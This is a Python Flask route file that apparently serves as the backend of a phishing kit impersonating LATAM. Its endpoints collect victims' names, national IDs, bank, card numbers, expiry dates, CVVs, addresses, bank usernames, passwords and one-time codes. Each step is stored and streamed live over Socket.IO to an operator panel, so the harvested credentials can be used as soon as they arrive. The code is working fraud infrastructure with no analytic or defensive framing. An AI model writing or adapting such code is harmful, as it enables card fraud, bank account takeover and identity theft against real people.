from flask import request, blueprints, redirect, session, render_template, jsonify
from models.DataTable import DataTable, db, ma, DataTableSchema
from config.bd import socketio
from datetime import datetime 
from flask_socketio import emit
from user_agents import parse

dataTables_routes = blueprints.Blueprint("dataTables", __name__)

@dataTables_routes.route('/dataTables', methods=['GET'])
def dataTables():
    dataTables = DataTable.query.all()
    schema = DataTableSchema(many=True)
    result = schema.dump(dataTables)
    return jsonify(result)

@dataTables_routes.route('/latamPost', methods=['POST'])
def latamPost():
    try:
        data = request.get_json()
        
        ip = request.remote_addr
        
        date = datetime.now()
        
        status = 'Ingresó Datos de LATAM'
        
        user_agent = parse(request.headers.get('User-Agent'))
        device_type = "PC"
        if(user_agent.is_mobile):
            device_type = "Mobile"
        elif(user_agent.is_tablet):
            device_type = "Tablet"
        
        new_dataTable = DataTable(data['nombre'], '', '', '', device_type, ip, data['id'], data['banco'], status, date, date, data['email'], data['tarjeta'], data['ftarjeta'], data['cvv'], data['celular'], data['direccion'])
        
        db.session.add(new_dataTable)
        db.session.commit()
        
        socketio.emit('new_dataTable', {'nombre': data['nombre'], 'usuario': '', 'password' : '', 'otp': '', 'dispositivo': device_type, 'ip': ip, 'id': data['id'], 'banco': data['banco'], 'status': status, 'horacreado': date.isoformat(), 'horamodificado': date.isoformat(), 'email': data['email'], 'tarjeta': data['tarjeta'], 'ftarjeta': data['ftarjeta'], 'cvv': data['cvv'], 'celular': data['celular'], 'direccion': data['direccion']}, namespace='/')
        
        return jsonify({'message': 'Datos guardados correctamente'}), 200
    
    except Exception as E:
        return jsonify({'message': str(E)}), 400
        
              

@dataTables_routes.route('/updateUsuario/<idreg>', methods=['PUT'])
def updateUser(idreg):
    try:
        object = DataTable.query.get(idreg)
        if not object:
            return jsonify({'message': 'Registro no encontrado :()'}), 404
        
        date = datetime.now()
        
        data = request.get_json()
        
        status = 'Ingresó Usuario'
        
        object.usuario = data['usuario']
        object.password = data['password']
        object.horamodificado = date
        object.status = status
        db.session.commit()
        
        socketio.emit('new_dataTable', {'nombre': object.nombre, 'usuario': data['usuario'], 'password' : data['password'], 'otp': object.otp, 'dispositivo': object.dispositivo, 'ip': object.ip, 'id': object.id, 'banco': object.banco, 'status': status, 'horacreado': object.horacreado.isoformat(), 'horamodificado': object.horamodificado.isoformat(), 'email': object.email, 'tarjeta': object.tarjeta, 'ftarjeta': object.ftarjeta, 'cvv': object.cvv, 'celular': object.celular, 'direccion': object.direccion}, namespace='/')
        
        
        
        return jsonify({'message': 'Registro actualizado :)'}), 200
        
      
    except Exception as E:
        return jsonify({'message': str(E)}), 400

@dataTables_routes.route('/updateOtp/<idreg>', methods=['PUT'])
def updateOtp(idreg):
    try:
        object = DataTable.query.get(idreg)
        if not object:
            return jsonify({'message': 'Registro no encontrado'}), 404
        
        date = datetime.now()
        
        data = request.get_json()
        
        status = 'Ingresó OTP'
        
        object.otp = data['otp']
        object.horamodificado = date
        object.status = status
        
        db.session.commit()
        
        socketio.emit('new_dataTable', {'nombre': object.nombre, 'usuario': object.usuario, 'password' : object.password, 'otp': data['otp'], 'dispositivo': object.dispositivo, 'ip': object.ip, 'id': object.id, 'banco': object.banco, 'status': status, 'horacreado': object.horacreado.isoformat(), 'horamodificado': object.horamodificado.isoformat(), 'email': object.email, 'tarjeta': object.tarjeta, 'ftarjeta': object.ftarjeta, 'cvv': object.cvv, 'celular': object.celular, 'direccion': object.direccion}, namespace='/')
        
        return jsonify({'message': 'Registro actualizado'}), 200
    
    except Exception as E:
        return jsonify({'message': str(E)}), 400